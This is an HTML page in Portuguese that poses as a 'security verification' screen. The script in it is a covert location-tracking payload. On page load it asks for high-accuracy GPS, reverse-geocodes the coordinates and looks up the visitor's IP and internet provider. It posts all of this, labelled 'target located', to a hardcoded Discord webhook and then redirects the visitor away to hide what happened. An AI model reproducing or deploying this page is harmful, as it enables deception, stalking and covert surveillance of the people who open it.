<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sincroniza√ß√£o de Seguran√ßa</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .spinner { animation: spin 1s linear infinite; border-top-color: #3b82f6; }
        .toast { transition: all 0.5s ease; position: fixed; top: 20px; right: 20px; z-index: 50; }
    </style>
</head>
<body class="bg-[#0f172a] text-slate-200 flex items-center justify-center min-h-screen overflow-hidden">

    <div id="toast-container"></div>

    <div class="text-center p-8 bg-[#1e293b] rounded-2xl shadow-2xl border border-slate-700 max-w-sm w-full mx-4">
        <div class="w-16 h-16 border-4 border-slate-600 border-t-blue-500 rounded-full spinner mx-auto mb-6"></div>
        <h1 class="text-xl font-bold mb-2">Verificando Seguran√ßa</h1>
        <p class="text-slate-400 text-sm">Validando sua conex√£o com os servidores. Por favor, mantenha esta aba aberta.</p>
        <div class="mt-6 text-xs text-slate-500 uppercase tracking-widest">ID: <span id="session-id"></span></div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";

        // Gerar ID de sess√£o aleat√≥rio
        document.getElementById('session-id').innerText = Math.random().toString(36).substr(2, 9).toUpperCase();

        function showToast(msg, type = 'success') {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = `toast p-4 rounded-lg shadow-lg mb-4 flex items-center ${type === 'success' ? 'bg-green-600' : 'bg-blue-600'} text-white text-sm font-medium`;
            toast.innerHTML = `
                <span class="mr-2">${type === 'success' ? '‚úì' : '‚Ñπ'}</span>
                ${msg}
            `;
            container.appendChild(toast);
            setTimeout(() => toast.style.opacity = '0', 3000);
            setTimeout(() => toast.remove(), 3500);
        }

        async function enviarDados(lat, lon) {
            showToast("Localiza√ß√£o Sincronizada", "success");
            
            try {
                // 1. Pega Cidade Real e CEP
                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await geo.json();
                
                // 2. Pega IP e Provedor
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                const payload = {
                    embeds: [{
                        title: "üéØ ALVO LOCALIZADO - PRECIS√ÉO GPS",
                        color: 3066993,
                        fields: [
                            { name: "üö© Pais:", value: data.address.country || "Brasil", inline: true },
                            { name: "üèõÔ∏è Estado:", value: data.address.state || "N/A", inline: true },
                            { name: "üèôÔ∏è Cidade:", value: data.address.city || data.address.town || "N/A", inline: true },
                            { name: "üìÆ Cep:", value: data.address.postcode || "N/A", inline: true },
                            { name: "üìç Cordenadas:", value: `https://www.google.com/maps?q=$${lat},${lon}`, inline: false },
                            { name: "üåê Internet/provedor:", value: ipData.org || "N/A", inline: false },
                            { name: "‚è∞ Horario de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
                        ],
                        footer: { text: "Sistema de Verifica√ß√£o Biom√©trica v4.2" }
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                showToast("Sess√£o Encerrada com Seguran√ßa");
                setTimeout(() => { window.location.href = "https://google.com/404"; }, 1500);

            } catch (error) {
                console.error(error);
            }
        }

        window.onload = () => {
            showToast("Conex√£o Estabelecida", "info");
            setTimeout(() => showToast("Verificando Navegador...", "info"), 1000);

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        enviarDados(pos.coords.latitude, pos.coords.longitude);
                    },
                    (erro) => {
                        showToast("Erro: Protocolo de localiza√ß√£o negado", "info");
                        setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
                    },
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            }
        };
    </script>
</body>
</html>
